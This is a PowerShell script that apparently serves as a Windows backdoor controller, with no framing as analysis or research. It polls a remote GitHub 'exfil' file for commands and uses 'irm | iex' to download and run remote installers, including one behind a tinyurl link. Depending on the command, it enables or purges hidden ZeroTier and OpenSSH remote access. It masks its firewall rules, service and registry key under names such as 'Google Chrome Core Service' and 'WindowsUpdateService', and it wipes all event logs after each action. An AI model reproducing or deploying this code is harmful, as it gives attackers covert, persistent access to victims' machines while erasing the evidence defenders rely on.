Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
$retryAttempts = 5
$ztservice = "ZeroTierOneService"
$ztservice2 = "IP Core Helper"
$sshdservice = "sshd"
$sshagentservice = "ssh-agent"
$ztfirewall = "ZeroTier One"
$ztfirewall2 = "ZeroTier x64 Binary In"
$ztfirewall3 = "ZeroTier UDP/9993 In"
$ssholdfirewall = "Google Chrome Core Service"
$sshfirewall = "Windows Runtime Broker"
$ztdir = "C:\ProgramData\ZeroTier"
$ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
$sshdir = "C:\Program Files\OpenSSH"
$sshdatadir = "C:\ProgramData\ssh"
$regPath = "HKLM:\Software\WindowsUpdateService"
$sshinstall = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/raw-ssh-install"
$ztinstall = "https://tinyurl.com/ztinstall"
$codeUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/CuesForRemoteHosts.txt?cachebuster=$(Get-Random)"
$programDataPath = $env:ProgramData
$storedData = (Get-ItemProperty -Path $regPath).Data
$storedCode = (Get-ItemProperty -Path $regPath).Code
#Function to add or update registry keys
function CheckAndUpdateRegistryCode {
    param (
        [string]$regPath = "HKLM:\Software\WindowsUpdateService"
    )
    if (Test-Path -Path $regPath) {
        $code = (Get-ItemProperty -Path $regPath).Code
        if ($code -match '^(6677\d{2}|001122)$') {
        } else {
            Set-ItemProperty -Path $regPath -Name 'Code' -Value '001122'
        }
    } else {
        New-ItemProperty -Path $regPath -Name 'Code' -PropertyType String -Value '001122'
    }
}
#Web Install
function web-install {
    param (
        [string]$InstallScriptURL
    )

    try {
        Write-Host "Installing Program from $InstallScriptURL..."
        $errorOutput = irm $InstallScriptURL 2>&1 | iex
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Web Install installation completed."
        } else {
            Write-Host "Installation failed with error: $errorOutput"
        }
    }
    catch {
        Write-Host "Failed to install Web Install: $_"
    }
}
#Function to start the services
function Start-ServiceSafe {
    param (
        [string]$ServiceName
    )
    try {
        $serviceStatus = Get-Service -Name $ServiceName -ErrorAction Stop
        if ($serviceStatus.Status -ne "Running") {
            # Check if the service is set to "Automatic" start
            if ($serviceStatus.StartType -ne "Automatic") {
                # Set the service to "Automatic" start
                Set-Service -Name $ServiceName -StartupType Automatic
            }
            # Start the service
            Start-Service -Name $ServiceName
        }
    }
    catch {
        Write-Host "Service $ServiceName not found or cannot be manipulated."
    }
}
#Function to stop and disable windows services
function Stop-AndDisable-ServiceSafe {
    param (
        [string]$ServiceName
    )
    try {
        $serviceStatus = Get-Service -Name $ServiceName -ErrorAction Stop
        if ($serviceStatus.Status -ne "Stopped") {
            # Stop the service
            Stop-Service -Name $ServiceName
        }
        # Set the service to Disabled
        Set-Service -Name $ServiceName -StartupType Disabled
    }
    catch {
        Write-Host "Service $ServiceName not found or cannot be manipulated."
    }
}
#Function to delete windows services
function Delete-ServiceSafe {
    param (
        [string]$ServiceName
    )
    try {
        $serviceStatus = Get-Service -Name $ServiceName -ErrorAction Stop
        # Stop the service if it is running
        if ($serviceStatus.Status -eq "Running") {
            Stop-Service -Name $ServiceName -Force
        }
        # Delete the service
        sc.exe delete $ServiceName
    }
    catch {
        Write-Host "Service $ServiceName not found or cannot be manipulated."
    }
}
#Function to disable firewall rules
function Disable-FirewallRules {
    param (
        [string]$ruleNames
    )  
    $ruleNames | ForEach-Object {
        $ruleName = $_
        try {
            netsh advfirewall firewall set rule name="$ruleName" new enable=no
        } catch {
            Write-Host "Failed to disable firewall rule $ruleName." -ForegroundColor Red
        }
    }
}
#Function to remove firewall rules
function Remove-FirewallRuleSafe {
    param (
        [string]$RuleName
    )

    try {
        $existingRule = Get-NetFirewallRule -DisplayName $RuleName -ErrorAction Stop
        if ($existingRule) {
            Remove-NetFirewallRule -DisplayName $existingRule
            Write-Host "Firewall rule '$RuleName' removed."
        }
    }
    catch {
        Write-Host "Firewall rule '$RuleName' not found or cannot be manipulated."
    }
}
#Function to enable firewall rules
function Enable-FirewallRule {
    param (
        [string]$ruleNames
    )
    $ruleNames | ForEach-Object {
        $ruleName = $_
        try {
            netsh advfirewall firewall set rule name="$ruleName" new enable=yes
        } catch {
            Write-Host "Failed to disable firewall rule $ruleName." -ForegroundColor Red
        }
    }
}
function Retry-Operation {
    param (
        [scriptblock]$Operation,
        [int]$MaxRetries
    )
    $retryCount = 0
    $retrySuccess = $false
    while ($retryCount -lt $MaxRetries -and -not $retrySuccess) {
        try {
            $Operation.Invoke()
            $retrySuccess = $true
        } catch {
            $errorMessage = $_.Exception.Message
            $retryCount++
        }
    }
    if (-not $retrySuccess) {
        Write-Host "Operation failed after $MaxRetries retries."
    }
}

#Function to Delete Directories
function Delete-Directories {
    param (
        [string]$directories
    )
    $directories | ForEach-Object {
        $directory = $_
        if (Test-Path -Path $directory -PathType Container) {
            try {
                Remove-Item -Path $directory -Force -Recurse -ErrorAction Stop
            } catch {
                Write-Host "Failed to delete directory $directory." -ForegroundColor Red
            }
        } else {
            Write-Host "Directory $directory does not exist." -ForegroundColor Yellow
        }
    }
}
# Check if the "Code" value is not null (i.e., it exists)
CheckAndUpdateRegistryCode
if ($storedCode -ne $null) {
    # Download the status values from the URL
    $webStatus = (Invoke-RestMethod -Uri $codeUrl).Split([Environment]::NewLine)
    # Initialize the variable to store the new status
    $status = $null
    # Iterate through web status values
    foreach ($line in $webStatus) {
        $code, $status = $line -split ' ', 2
        if ($code -eq $storedCode) {
            # Match found
            if ($status -eq $storedData) {
                # Status matches, exit
                exit
            } else {        
                # Perform actions based on status
                switch ($status) {
                    "active" {
                		Retry-Operation {
                    				Start-ServiceSafe -ServiceName $ztservice
                    				Start-ServiceSafe -ServiceName $sshagentservice
                    				Start-ServiceSafe -ServiceName $sshdservice
                    				Enable-FirewallRule -ruleName $ztfirewall
                    				Enable-FirewallRule -ruleName $ztfirewall2
                    				Enable-FirewallRule -ruleName $ztfirewall3
                    				Enable-FirewallRule -ruleName $sshfirewall
                    				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
                    		} -MaxRetries $retryAttempts
                	}
                    "dormant" {
                    		Retry-Operation {
                    				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                    				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
                    				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
                    				Disable-FirewallRules -ruleName $ztfirewall
                    				Disable-FirewallRules -ruleName $ztfirewall2
                    				Disable-FirewallRules -ruleName $ztfirewall3
                    				Disable-FirewallRules -ruleName $sshfirewall
                    				Disable-FirewallRules -ruleName $ssholdfirewall
                    				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
		        	} -MaxRetries $retryAttempts
                	}
                    "rejoin" {
              			Retry-Operation {
                      				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                      				Stop-AndDisable-ServiceSafe -ServiceName $ztservice2
                      				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
                      				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
                      				Delete-ServiceSafe -ServiceName $ztservice
                      				Delete-ServiceSafe -ServiceName $ztservice2
                      				Delete-ServiceSafe -ServiceName $sshagentservice
                      				Delete-ServiceSafe -ServiceName $sshdservice							
                      				Disable-FirewallRules -ruleName $ztfirewall
                      				Disable-FirewallRules -ruleName $sshfirewall
                      				Remove-FirewallRuleSafe -RuleName $ztfirewall
                      				Remove-FirewallRuleSafe -RuleName $sshfirewall							
                      				Delete-Directories -directories $ztdir
                      				Delete-Directories -directories $sshdir
                      				Delete-Directories -directories $sshdatadir
                      				Delete-Directories -directories $ztdatadir
                      				web-install -InstallScriptURL $sshinstall
                      				web-install -InstallScriptURL $ztinstall
                      				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
		              	} -MaxRetries $retryAttempts
			}
                    "purge" {
	                        Retry-Operation {
                      				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                      				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
                      				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
                      				Delete-ServiceSafe -ServiceName $ztservice
                      				Delete-ServiceSafe -ServiceName $ztservice2
                      				Delete-ServiceSafe -ServiceName $sshagentservice
                      				Delete-ServiceSafe -ServiceName $sshdservice							
                      				Disable-FirewallRules -ruleName $ztfirewall
                      				Disable-FirewallRules -ruleName $ztfirewall2
                      				Disable-FirewallRules -ruleName $ztfirewall3
                      				Disable-FirewallRules -ruleName $sshfirewall
                      				Disable-FirewallRules -ruleName $ssholdfirewall
                      				Remove-FirewallRuleSafe -RuleName $ztfirewall
                      				Remove-FirewallRuleSafe -ruleName $ztfirewall2
                      				Remove-FirewallRuleSafe -ruleName $ztfirewall3
                      				Remove-FirewallRuleSafe -RuleName $sshfirewall
                      				Remove-FirewallRuleSafe -ruleName $ssholdfirewall
                      				Delete-Directories -directories $ztdir
                      				Delete-Directories -directories $sshdir
                      				Delete-Directories -directories $sshdatadir
                      				Delete-Directories -directories $ztdatadir
                      				Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
			                } -MaxRetries $retryAttempts
				}
              		#Zerotier Purged, OpenSSH Disbaled
              		"zpod" {
					Retry-Operation {
                				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
                				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
                       				Delete-ServiceSafe -ServiceName $ztservice										
                        			Disable-FirewallRules -ruleName $ztfirewall
                				Disable-FirewallRules -ruleName $ztfirewall2
                				Disable-FirewallRules -ruleName $ztfirewall3
                				Disable-FirewallRules -ruleName $sshfirewall
                				Disable-FirewallRules -ruleName $ssholdfirewall
                				Remove-FirewallRuleSafe -RuleName $ztfirewall
                				Remove-FirewallRuleSafe -ruleName $ztfirewall2
                        			Remove-FirewallRuleSafe -ruleName $ztfirewall3
                        			Delete-Directories -directories $ztdir
                        			Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
              				} -MaxRetries $retryAttempts
				}
              		#Zerotier Install, OpenSSH Enabled
              		"zioe" {
                         		Retry-Operation {				
                        			Start-ServiceSafe -ServiceName $sshagentservice
                        			Start-ServiceSafe -ServiceName $sshdservice
                				Enable-FirewallRule -ruleName $sshfirewall
                        			web-install -InstallScriptURL $ztinstall
                        			Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
                  			} -MaxRetries $retryAttempts
              	  		}                
              	  	}
                if ($status -ne $null) {
        		Set-ItemProperty -Path $regPath -Name "Data" -Value $status
		}
                break
            }
        }
    }
} else {}
